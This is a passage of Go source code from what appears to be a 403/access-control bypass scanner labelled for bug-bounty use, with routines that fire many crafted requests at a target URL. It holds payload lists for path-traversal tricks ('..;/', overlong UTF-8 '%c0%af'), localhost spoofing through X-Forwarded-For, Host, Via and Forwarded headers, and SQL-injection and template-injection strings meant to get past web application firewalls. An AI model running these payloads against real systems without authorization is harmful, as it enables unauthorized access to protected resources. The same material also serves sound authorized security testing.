	if len(pathParts) == 0 || (len(pathParts) == 1 && pathParts[0] == "") {
		log.Println("No path to manipulate for bug bounty techniques")
		return
	}

	lastPart := pathParts[len(pathParts)-1]
	previousParts := baseURL
	if len(pathParts) > 1 {
		previousParts = baseURL + "/" + strings.Join(pathParts[:len(pathParts)-1], "/")
	}

	w := goccm.New(maxGoroutines)

	for _, line := range lines {
		time.Sleep(time.Duration(delay) * time.Millisecond)
		w.Wait()
		go func(line string) {
			defer w.Done()

			var modifiedURL string
			
			// Apply different patterns based on the payload
			switch line {
			case "%2e":
				modifiedURL = previousParts + "/%" + "2e/" + lastPart
			case "%ef%bc%8f":
				modifiedURL = previousParts + "/%" + "ef%bc%8f" + lastPart
			case "?":
				modifiedURL = options.uri + "?"
			case "??":
				modifiedURL = options.uri + "??"
			case "//":
				modifiedURL = options.uri + "//"
			case "/":
				if !strings.HasSuffix(options.uri, "/") {
					modifiedURL = options.uri + "/"
				} else {
					return // Already has trailing slash
				}
			case "./.":
				modifiedURL = previousParts + "/./" + lastPart + "/./"
			case "/.randomstring":
				modifiedURL = options.uri + "/.randomstring"
			case "..;/":
				modifiedURL = options.uri + "..;/"
			case "..;":
				modifiedURL = options.uri + "..;"
			case ".;":
				modifiedURL = previousParts + "/.;/" + lastPart
			case ".;/.;/":
				modifiedURL = previousParts + "/.;/" + lastPart + "/.;/"
			case ";foo=bar":
				modifiedURL = previousParts + "/;foo=bar/" + lastPart
			default:
				modifiedURL = options.uri + line
			}

			statusCode, response, err := request(options.method, modifiedURL, options.headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
			if err != nil {
				log.Println(err)
				return
			}

			contentLength := len(response)

			if contentLength == defaultCl {
				return
			}

			result := Result{
				line:          modifiedURL,
				statusCode:    statusCode,
				contentLength: len(response),
				defaultReq:    false,
			}
			printResponse(result, "bugbounty-tips")
		}(line)
	}
	w.WaitAllDone()
}

// ============================================================================
// MONSTER EXCLUSIVE TECHNIQUES
// ============================================================================

// requestIPv6Bypass tests IPv6 localhost representations that many WAFs fail to check
func requestIPv6Bypass(options RequestOptions) {
	color.Cyan("\n━━━━━━━━━━━━━━━ IPv6 BYPASS ━━━━━━━━━━━━━━━")

	ipv6Values := []string{
		"::1",
		"[::1]",
		"0:0:0:0:0:0:0:1",
		"[0:0:0:0:0:0:0:1]",
		"0000:0000:0000:0000:0000:0000:0000:0001",
		"::ffff:127.0.0.1",
		"::ffff:7f00:1",
		"[::ffff:127.0.0.1]",
		"::127.0.0.1",
		"0:0:0:0:0:ffff:127.0.0.1",
	}

	testHeaders := []string{"X-Forwarded-For", "X-Client-IP", "X-Real-IP", "True-Client-IP"}

	w := goccm.New(maxGoroutines)

	for _, hdr := range testHeaders {
		for _, ipv6 := range ipv6Values {
			time.Sleep(time.Duration(delay) * time.Millisecond)
			w.Wait()
			go func(hdr, ipv6 string) {
				defer w.Done()
				headers := append(options.headers, header{hdr, ipv6})
				statusCode, response, err := request(options.method, options.uri, headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
				if err != nil {
					return
				}

				if len(response) == defaultCl {
					return
				}

				result := Result{
					line:          hdr + ": " + ipv6,
					statusCode:    statusCode,
					contentLength: len(response),
				}
				printResponse(result, "ipv6")
			}(hdr, ipv6)
		}
	}
	w.WaitAllDone()
}

// requestHostHeader manipulates Host header to bypass virtual host restrictions
func requestHostHeader(options RequestOptions) {
	color.Cyan("\n━━━━━━━━━━━━━━━ HOST HEADER MANIPULATION ━━━━━━━━━━━━━━━")

	parsedURL, err := url.Parse(options.uri)
	if err != nil {
		log.Println(err)
		return
	}
	domain := parsedURL.Host

	hostValues := []string{
		"localhost",
		"127.0.0.1",
		"127.0.0.1:80",
		"127.0.0.1:443",
		"127.0.0.1:8080",
		"[::1]",
		"0.0.0.0",
		"0",
		domain,
		"admin." + domain,
		"internal." + domain,
		"dev." + domain,
		"test." + domain,
		"staging." + domain,
		"backend." + domain,
		"api." + domain,
		"localhost." + domain,
		domain + ":80",
		domain + ":443",
		domain + ":8080",
	}

	w := goccm.New(maxGoroutines)

	for _, hostVal := range hostValues {
		time.Sleep(time.Duration(delay) * time.Millisecond)
		w.Wait()
		go func(hostVal string) {
			defer w.Done()
			headers := append(options.headers, header{"Host", hostVal})
			statusCode, response, err := request(options.method, options.uri, headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
			if err != nil {
				return
			}

			if len(response) == defaultCl {
				return
			}

			result := Result{
				line:          "Host: " + hostVal,
				statusCode:    statusCode,
				contentLength: len(response),
			}
			printResponse(result, "host-header")
		}(hostVal)
	}
	w.WaitAllDone()
}

// requestUnicodeBypass uses overlong UTF-8 encoding and Unicode characters to bypass path filters
func requestUnicodeBypass(options RequestOptions) {
	color.Cyan("\n━━━━━━━━━━━━━━━ UNICODE/OVERLONG BYPASS ━━━━━━━━━━━━━━━")

	unicodePayloads := []string{
		// Overlong slash
		"%c0%af", "%e0%80%af", "%f0%80%80%af", "%c0%2f",
		"%u002f", "%uFF0F", "%%32%66", "%25%32%66",
		// Overlong dot/backslash
		"%c0%2e", "%e0%80%2e", "%u002e", "%uff0e",
		"%c0%5c", "%c1%9c", "%u005c", "%uFF3C",
		// IIS Unicode
		"%u002e%u002e%u002f", "%u002e%u002e%u005c", "..%u002f", "..%u005c",
		"%u002e%u002e/", "%252e%252e%252f", "%255c%252e%252e",
	}

	w := goccm.New(maxGoroutines)

	for _, payload := range unicodePayloads {
		time.Sleep(time.Duration(delay) * time.Millisecond)
		w.Wait()
		go func(payload string) {
			defer w.Done()
			modifiedURL := options.uri + payload
			statusCode, response, err := request(options.method, modifiedURL, options.headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
			if err != nil {
				return
			}

			if len(response) == defaultCl {
				return
			}

			result := Result{
				line:          modifiedURL,
				statusCode:    statusCode,
				contentLength: len(response),
			}
			printResponse(result, "unicode")
		}(payload)
	}
	w.WaitAllDone()
}

// requestWAFBypass uses SQL injection-like payloads to confuse WAFs
func requestWAFBypass(options RequestOptions) {
	color.Cyan("\n━━━━━━━━━━━━━━━ WAF/SQLI BYPASS ━━━━━━━━━━━━━━━")

	wafPayloads := []string{
		"/'%20or%201.e(%22)%3D'",
		"/1.e(ascii",
		"/1.e(substring(",
		"/%27%20or%201=1--",
		"/%27%20and%201=1--",
		"/{{constructor.constructor('return this')()}}",
	}

	w := goccm.New(maxGoroutines)

	for _, payload := range wafPayloads {
		time.Sleep(time.Duration(delay) * time.Millisecond)
		w.Wait()
		go func(payload string) {
			defer w.Done()
			modifiedURL := options.uri + payload
			statusCode, response, err := request(options.method, modifiedURL, options.headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
			if err != nil {
				return
			}

			if len(response) == defaultCl {
				return
			}

			result := Result{
				line:          "WAF: " + payload,
				statusCode:    statusCode,
				contentLength: len(response),
			}
			printResponse(result, "waf-bypass")
		}(payload)
	}
	w.WaitAllDone()
}

// requestWaybackCheck checks archive.org for historical snapshots
func requestWaybackCheck(options RequestOptions) {
	color.Cyan("\n━━━━━━━━━━━━━━━ WAYBACK INTELLIGENCE ━━━━━━━━━━━━━━━")

	// Wayback availability API
	waybackURL := "https://archive.org/wayback/available?url=" + options.uri

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Get(waybackURL)
	if err != nil {
		log.Printf("Wayback API error: %v", err)
		return
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	var wayback WaybackResponse
	json.Unmarshal(body, &wayback)

	if wayback.ArchivedSnapshots.Closest.Available {
		fmt.Printf("%s Archived snapshot found!\n", color.GreenString("[+]"))
		fmt.Printf("    URL: %s\n", wayback.ArchivedSnapshots.Closest.URL)
		fmt.Printf("    Timestamp: %s\n", wayback.ArchivedSnapshots.Closest.Timestamp)

		// Try to access archived version
		statusCode, response, _ := request(options.method, wayback.ArchivedSnapshots.Closest.URL, options.headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
		result := Result{
			line:          "Wayback: " + wayback.ArchivedSnapshots.Closest.URL,
			statusCode:    statusCode,
			contentLength: len(response),
		}
		printResponse(result, "wayback")
	} else {
		fmt.Printf("%s No archived snapshots found\n", color.YellowString("[*]"))
	}

	// CDX API check
	cdxURL := "http://web.archive.org/cdx/search/cdx?url=" + options.uri + "&output=json&limit=5"
	resp2, err := client.Get(cdxURL)
	if err == nil && resp2 != nil {
		defer resp2.Body.Close()
		body2, _ := io.ReadAll(resp2.Body)
		if len(body2) > 2 && string(body2) != "[]" {
			fmt.Printf("%s Historical records: https://web.archive.org/web/*/%s\n", color.GreenString("[+]"), options.uri)
		}
	}
}

// requestViaHeader uses Via header to spoof proxy chain information
func requestViaHeader(options RequestOptions) {
	color.Cyan("\n━━━━━━━━━━━━━━━ VIA HEADER BYPASS ━━━━━━━━━━━━━━━")

	viaValues := []string{
		"1.0 localhost",
		"1.1 localhost",
		"1.1 127.0.0.1",
		"1.1 internal-proxy",
		"1.0 fred, 1.1 nowhere.com",
	}

	w := goccm.New(maxGoroutines)

	for _, via := range viaValues {
		time.Sleep(time.Duration(delay) * time.Millisecond)
		w.Wait()
		go func(via string) {
			defer w.Done()
			headers := append(options.headers, header{"Via", via})
			statusCode, response, err := request(options.method, options.uri, headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
			if err != nil {
				return
			}

			if len(response) == defaultCl {
				return
			}

			result := Result{
				line:          "Via: " + via,
				statusCode:    statusCode,
				contentLength: len(response),
			}
			printResponse(result, "via-header")
		}(via)
	}
	w.WaitAllDone()
}

// requestForwardedHeader uses standardized Forwarded header (RFC 7239)
func requestForwardedHeader(options RequestOptions) {
	color.Cyan("\n━━━━━━━━━━━━━━━ FORWARDED RFC 7239 ━━━━━━━━━━━━━━━")

	forwardedValues := []string{
		"for=127.0.0.1",
		"for=localhost",
		"for=127.0.0.1;proto=http",
		"for=127.0.0.1;proto=https",
		"for=127.0.0.1;host=localhost",
		"for=127.0.0.1;by=127.0.0.1",
		`for="[::1]"`,
		"for=192.168.1.1, for=127.0.0.1",
	}

	w := goccm.New(maxGoroutines)

	for _, fwd := range forwardedValues {
		time.Sleep(time.Duration(delay) * time.Millisecond)
		w.Wait()
		go func(fwd string) {
			defer w.Done()
			headers := append(options.headers, header{"Forwarded", fwd})
			statusCode, response, err := request(options.method, options.uri, headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
			if err != nil {
				return
			}

			if len(response) == defaultCl {
				return
			}

			result := Result{
				line:          "Forwarded: " + fwd,
				statusCode:    statusCode,
				contentLength: len(response),
			}
			printResponse(result, "forwarded")
		}(fwd)
	}
	w.WaitAllDone()
}

// requestCacheHeaders uses cache control headers to bypass cached 403 responses
func requestCacheHeaders(options RequestOptions) {
	color.Cyan("\n━━━━━━━━━━━━━━━ CACHE CONTROL BYPASS ━━━━━━━━━━━━━━━")

	cacheHeaders := []struct{ key, value string }{
		{"Cache-Control", "no-cache"},
		{"Cache-Control", "no-store"},
		{"Cache-Control", "max-age=0"},
		{"Pragma", "no-cache"},
		{"If-None-Match", "*"},
		{"If-Modified-Since", "Thu, 01 Jan 1970 00:00:00 GMT"},
	}

	w := goccm.New(maxGoroutines)

	for _, ch := range cacheHeaders {
		time.Sleep(time.Duration(delay) * time.Millisecond)
		w.Wait()
		go func(ch struct{ key, value string }) {
			defer w.Done()
			headers := append(options.headers, header{ch.key, ch.value})
			statusCode, response, err := request(options.method, options.uri, headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
			if err != nil {
				return
			}

			if len(response) == defaultCl {
				return
			}

			result := Result{
				line:          ch.key + ": " + ch.value,
				statusCode:    statusCode,
				contentLength: len(response),
			}
			printResponse(result, "cache-control")
		}(ch)
	}
	w.WaitAllDone()
}

// requestAcceptHeader manipulates Accept header to request different content types
func requestAcceptHeader(options RequestOptions) {
	color.Cyan("\n━━━━━━━━━━━━━━━ ACCEPT HEADER BYPASS ━━━━━━━━━━━━━━━")

	acceptValues := []string{
		"text/html",
		"application/json",
		"application/xml",
		"*/*",
		"text/plain",
		"application/x-www-form-urlencoded",
	}

	w := goccm.New(maxGoroutines)

	for _, accept := range acceptValues {
		time.Sleep(time.Duration(delay) * time.Millisecond)
		w.Wait()
		go func(accept string) {
			defer w.Done()
			headers := append(options.headers, header{"Accept", accept})
			statusCode, response, err := request(options.method, options.uri, headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
			if err != nil {
				return
			}

			if len(response) == defaultCl {
				return
			}

			result := Result{
				line:          "Accept: " + accept,
				statusCode:    statusCode,
				contentLength: len(response),
			}
			printResponse(result, "accept-header")
		}(accept)
	}
	w.WaitAllDone()
}

// requestProtocolBypass tests HTTP/HTTPS downgrade/upgrade attacks
func requestProtocolBypass(options RequestOptions) {
	color.Cyan("\n━━━━━━━━━━━━━━━ PROTOCOL BYPASS ━━━━━━━━━━━━━━━")

	// Generate HTTP/HTTPS variants
	httpURL := strings.Replace(options.uri, "https://", "http://", 1)
	httpsURL := strings.Replace(options.uri, "http://", "https://", 1)

	w := goccm.New(maxGoroutines)

	// HTTP downgrade
	w.Wait()
	go func() {
		defer w.Done()
		statusCode, response, err := request(options.method, httpURL, options.headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
		if err != nil {
			return
		}
		result := Result{line: "HTTP downgrade: " + httpURL, statusCode: statusCode, contentLength: len(response)}
		printResponse(result, "protocol")
	}()

	// HTTPS upgrade
	w.Wait()
	go func() {
		defer w.Done()
		statusCode, response, err := request(options.method, httpsURL, options.headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
		if err != nil {
			return
		}
		result := Result{line: "HTTPS upgrade: " + httpsURL, statusCode: statusCode, contentLength: len(response)}
		printResponse(result, "protocol")
	}()

	// X-Forwarded-Scheme
	schemes := []string{"http", "https", "nothttps"}
	for _, scheme := range schemes {
		time.Sleep(time.Duration(delay) * time.Millisecond)
		w.Wait()
		go func(scheme string) {
			defer w.Done()
			headers := append(options.headers, header{"X-Forwarded-Scheme", scheme})
			statusCode, response, err := request(options.method, options.uri, headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
			if err != nil {
				return
			}
			result := Result{line: "X-Forwarded-Scheme: " + scheme, statusCode: statusCode, contentLength: len(response)}
			printResponse(result, "protocol")
		}(scheme)
	}
	w.WaitAllDone()
}

// requestPortBypass tests X-Forwarded-Port header with different port values
func requestPortBypass(options RequestOptions) {
	color.Cyan("\n━━━━━━━━━━━━━━━ PORT BYPASS ━━━━━━━━━━━━━━━")

	ports := []string{"80", "443", "8080", "8443", "4443", "8000", "8888", "9443"}

	w := goccm.New(maxGoroutines)

	for _, port := range ports {
		time.Sleep(time.Duration(delay) * time.Millisecond)
		w.Wait()
		go func(port string) {
			defer w.Done()
			headers := append(options.headers, header{"X-Forwarded-Port", port})
			statusCode, response, err := request(options.method, options.uri, headers, options.proxy, options.rateLimit, options.timeout, options.redirect)
			if err != nil {
				return
			}

			if len(response) == defaultCl {
				return
			}

			result := Result{
				line:          "X-Forwarded-Port: " + port,
				statusCode:    statusCode,
				contentLength: len(response),
			}
			printResponse(result, "port")
		}(port)
	}
	w.WaitAllDone()
}

// requestHttpVersionsEnhanced tests all HTTP versions (1.0, 1.1, 2, 2-prior-knowledge)
func requestHttpVersionsEnhanced(options RequestOptions) {
	color.Cyan("\n━━━━━━━━━━━━━━━ HTTP VERSION BYPASS (ENHANCED) ━━━━━━━━━━━━━━━")

	httpVersions := []string{"--http1.0", "--http1.1", "--http2", "--http2-prior-knowledge"}

	for _, version := range httpVersions {
		res := curlRequest(options.uri, options.proxy.Host, version)
		if res.statusCode != 0 {
			printResponse(res, "http-versions")
		}
	}
}

// ============================================================================
// OUTPUT FEATURES
// ============================================================================

// setupGracefulExit handles Ctrl+C interrupt
func setupGracefulExit(options RequestOptions) {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-c
		interrupted = true
		fmt.Println(color.YellowString("\n\n[!] Interrupted. Generating summary..."))
		printSummary(options)
		writeJSONOutput(options)
		os.Exit(130)
	}()
}

// printSummary displays scan statistics and potential bypasses
func printSummary(options RequestOptions) {
	if !showSummary {
		return
	}

	duration := time.Since(startTime)

	fmt.Println("\n" + color.MagentaString(strings.Repeat("═", 60)))
	fmt.Println(color.MagentaString("                    SCAN SUMMARY"))
	fmt.Println(color.MagentaString(strings.Repeat("═", 60)))

	fmt.Printf("  Target:             %s\n", options.uri)
	fmt.Printf("  Total Requests:     %d\n", atomic.LoadInt64(&totalCount))
	fmt.Printf("  Successful (2xx):   %s\n", color.GreenString("%d", atomic.LoadInt64(&successCount)))
	fmt.Printf("  Redirects (3xx):    %s\n", color.YellowString("%d", atomic.LoadInt64(&redirectCount)))
	fmt.Printf("  Errors (5xx):       %s\n", color.MagentaString("%d", atomic.LoadInt64(&errorCount)))
	fmt.Printf("  Scan Duration:      %s\n", duration.Round(time.Millisecond))

	total := atomic.LoadInt64(&totalCount)
	success := atomic.LoadInt64(&successCount)
	if total > 0 {
		successRate := float64(success) * 100 / float64(total)
		fmt.Printf("  Success Rate:       %.1f%%\n", successRate)
	}

	bypassesMutex.Lock()
	bypassCount := len(bypasses)
	bypassesMutex.Unlock()

	if bypassCount > 0 {
		fmt.Println("\n" + color.GreenString("POTENTIAL BYPASSES FOUND:"))
		fmt.Println(color.MagentaString(strings.Repeat("─", 60)))
		bypassesMutex.Lock()
		for _, bypass := range bypasses {
			fmt.Printf("  %s %s\n", color.GreenString("[+]"), bypass)
		}
		bypassesMutex.Unlock()
	}

	fmt.Println(color.MagentaString(strings.Repeat("═", 60)))

	if bypassCount > 0 {
		fmt.Println(color.GreenString("[!] POTENTIAL BYPASS FOUND - Manual verification recommended"))
	} else {
		fmt.Println(color.YellowString("[*] No obvious bypasses found - try different modes"))
	}
}

// writeJSONOutput saves results to JSON file
func writeJSONOutput(options RequestOptions) {
	if len(jsonOutput) == 0 {
		return
	}

	duration := time.Since(startTime)
	total := atomic.LoadInt64(&totalCount)
	success := atomic.LoadInt64(&successCount)

	var successRate float64
	if total > 0 {
		successRate = float64(success) * 100 / float64(total)
	}

	bypassesMutex.Lock()
	bypassList := make([]string, len(bypasses))
	copy(bypassList, bypasses)
	bypassesMutex.Unlock()

	output := JSONOutput{
		Target:    options.uri,
		StartTime: startTime.Format(time.RFC3339),
		EndTime:   time.Now().Format(time.RFC3339),
	}

	jsonMutex.Lock()
	output.Results = jsonResults
	jsonMutex.Unlock()

	output.Summary.Total = total
	output.Summary.Success = success
	output.Summary.Redirects = atomic.LoadInt64(&redirectCount)
	output.Summary.Errors = atomic.LoadInt64(&errorCount)
	output.Summary.Duration = duration.Round(time.Millisecond).String()
	output.Summary.SuccessRate = successRate
	output.Summary.Bypasses = bypassList

	data, err := json.MarshalIndent(output, "", "  ")
	if err != nil {
		log.Printf("Error marshaling JSON: %v", err)
		return
	}

	err = os.WriteFile(jsonOutput, data, 0644)
	if err != nil {
		log.Printf("Error writing JSON file: %v", err)
		return
	}

	fmt.Printf("%s Results saved to: %s\n", color.GreenString("[+]"), jsonOutput)
}

// resetStatistics clears all statistics for a new scan
func resetStatistics() {
	atomic.StoreInt64(&totalCount, 0)
	atomic.StoreInt64(&successCount, 0)
	atomic.StoreInt64(&redirectCount, 0)
	atomic.StoreInt64(&errorCount, 0)
	startTime = time.Now()

	bypassesMutex.Lock()
	bypasses = nil
	bypassesMutex.Unlock()

	jsonMutex.Lock()
	jsonResults = nil
	jsonMutex.Unlock()

	interrupted = false
}
